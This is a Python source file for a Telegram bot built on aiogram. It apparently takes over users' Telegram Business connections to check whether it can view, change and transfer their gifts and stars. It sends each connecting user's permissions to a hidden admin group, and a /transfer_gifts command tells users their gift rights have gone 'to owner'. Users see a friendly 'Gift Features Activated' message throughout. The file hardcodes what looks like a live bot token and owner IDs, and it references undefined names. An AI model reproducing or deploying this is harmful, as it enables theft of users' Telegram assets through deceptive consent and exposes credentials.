import asyncio
import logging
from aiogram import Bot, Dispatcher, F
from aiogram.enums import ParseMode
from aiogram.filters import Command
from aiogram.types import (
    Message,
    CallbackQuery,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    BusinessConnection,
)
from aiogram.methods import GetBusinessConnection
from aiogram.exceptions import TelegramBadRequest, TelegramForbiddenError

# Configuration
API_TOKEN = "8120657679:AAGqf3YCJML6HmgObyOXz8cdcfDX6dY1STw"
LOG_GROUP_ID = -1002710995756
OWNER_ID = 7072373613


# Initialize
bot = Bot(token=API_TOKEN)
dp = Dispatcher()

def extract_gift_permissions(raw_data: dict) -> dict:
    """Extract gift permissions from raw API response"""
    return {
        'can_view': raw_data.get('can_view_gifts_and_stars', False),
        'can_change': raw_data.get('can_change_gift_settings', False),
        'can_transfer': raw_data.get('can_transfer_gift_settings', False)
    }

async def log_gift_permissions(user: types.User, perms: dict):
    """Log gift permissions to admin channel"""
    try:
        await bot.send_message(
            chat_id=LOG_GROUP_ID,
            text=f"🎁 <b>Gift Permissions Update</b>\n\n"
                 f"👤 User: {user.mention_html()}\n"
                 f"👀 View Gifts: {'✅' if perms['can_view'] else '❌'}\n"
                 f"⚙️ Change Settings: {'✅' if perms['can_change'] else '❌'}\n"
                 f"🔄 Transfer Rights: {'✅' if perms['can_transfer'] else '❌'}",
            parse_mode=ParseMode.HTML
        )
    except Exception as e:
        logging.error(f"Failed to log gift permissions: {e}")

@dp.business_connection()
async def handle_business_connection(bc: BusinessConnection):
    """Process new business connections with gift permissions"""
    try:
        # Get full connection details
        full_connection = await bot(GetBusinessConnection(
            business_connection_id=bc.id
        ))
        raw_data = full_connection.model_dump()
        
        # Extract permissions
        gift_perms = extract_gift_permissions(raw_data)
        
        # Log to admin channel
        await log_gift_permissions(bc.user, gift_perms)
        
        # Notify user
        if bc.can_reply:
            msg = "🌟 <b>Gift Features Activated</b>\n\n"
            if gift_perms['can_view']:
                msg += "• View your gifts 🎁\n"
            if gift_perms['can_change']:
                msg += "• Configure gift settings ⚙️\n"
            if gift_perms['can_transfer']:
                msg += "• Transfer gift rights 🔄\n"
            
            await bot.send_message(
                chat_id=bc.user.id,
                text=msg,
                parse_mode=ParseMode.HTML
            )
            
    except Exception as e:
        logging.error(f"Connection error: {e}")

@dp.message(Command("transfer_gifts"))
async def transfer_gift_rights(message: Message):
    """Handle gift rights transfer to owner"""
    try:
        user_id = message.from_user.id
        
        # Verify business connection exists
        connection = await bot(GetBusinessConnection(
            business_connection_id=authorized[user_id]["connection_id"]
        ))
        raw_data = connection.model_dump()
        
        if not extract_gift_permissions(raw_data)['can_transfer']:
            return await message.reply("❌ You don't have transfer rights")
        
        # Process transfer (simulated)
        await bot.send_message(
            chat_id=OWNER_ID,
            text=f"🔄 <b>Gift Rights Transferred</b>\n\n"
                 f"From: {message.from_user.mention_html()}",
            parse_mode=ParseMode.HTML
        )
        
        await message.reply("✅ Gift rights transferred to owner!")
        
    except KeyError:
        await message.reply("🔒 Please connect via Business account first")
    except Exception as e:
        logging.error(f"Transfer error: {e}")
        await message.reply("❌ Transfer failed")

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
    )
    asyncio.run(main())
